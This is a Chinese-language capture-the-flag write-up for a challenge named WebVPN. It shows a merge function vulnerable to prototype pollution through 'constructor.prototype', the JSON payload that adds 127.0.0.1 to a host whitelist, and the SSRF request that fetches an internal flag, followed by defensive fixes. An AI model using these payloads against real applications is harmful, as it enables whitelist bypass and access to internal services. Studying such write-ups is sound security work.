# WebVPN

## 题目简述

应用提供一个代理接口，但只允许访问 `strategy` 白名单中的主机。用户信息更新使用自定义递归合并函数，虽然过滤了键名中包含 `__` 的字段，却仍允许沿 `constructor.prototype` 递归写入 `Object.prototype`。

污染出属性 `Object.prototype["127.0.0.1"] = true` 后，普通白名单对象在查询 `strategy["127.0.0.1"]` 时会从原型链继承到 `true`，从而绕过 Host 限制。再通过代理请求内网 `http://127.0.0.1:3000/flag` 即可取得 flag。

## 解题过程

存在问题的合并函数为：

```javascript
function update(dst, src) {
  for (key in src) {
    if (key.indexOf("__") != -1) {
      continue;
    }
    if (typeof src[key] == "object" && dst[key] !== undefined) {
      update(dst[key], src[key]);
      continue;
    }
    dst[key] = src[key];
  }
}
```

过滤器只会拦截 `__proto__` 这类包含双下划线的键。对普通对象而言，`dst.constructor` 继承自 `Object.prototype`，其值是全局 `Object` 构造函数；继续访问 `dst.constructor.prototype` 就直接到达 `Object.prototype`。因此不需要使用任何带 `__` 的键也能污染全局原型。

在已登录会话中向 `/user/info` 发送：

```http
POST /user/info HTTP/1.1
Content-Type: application/json
Cookie: session=YOUR_SESSION

{"constructor":{"prototype":{"127.0.0.1":true}}}
```

递归过程等价于：

```javascript
Object.prototype["127.0.0.1"] = true;
```

若白名单检查形如：

```javascript
if (!strategy[url.hostname]) {
  throw new Error("host not allowed");
}
```

那么 `strategy` 即使没有自有属性 `127.0.0.1`，属性查找也会从原型链得到刚污染的 `true`。随后通过 SSRF 访问内部 flag 服务：

```http
GET /proxy?url=http://127.0.0.1:3000/flag HTTP/1.1
Cookie: session=YOUR_SESSION
```

代理响应中即可读取 flag。官方 PDF 没有记录具体字符串，因此这里不补造结果。

## 方法总结

- 防守原型链污染不能只过滤 `__proto__`；`constructor.prototype` 是同样常见的到达路径。
- 白名单判断必须只接受自有属性，例如 `Object.hasOwn(strategy, hostname)`，或使用 `Object.create(null)`/`Map` 保存策略。
- 通用递归合并不应递归进入继承属性或函数对象；遍历源对象时也应使用 `Object.keys`，避免 `for...in` 带入继承键。
- 原型链污染本身通常只是状态篡改原语，本题真正的影响是改变 SSRF Host 白名单决策，最终访问内网 flag 接口。
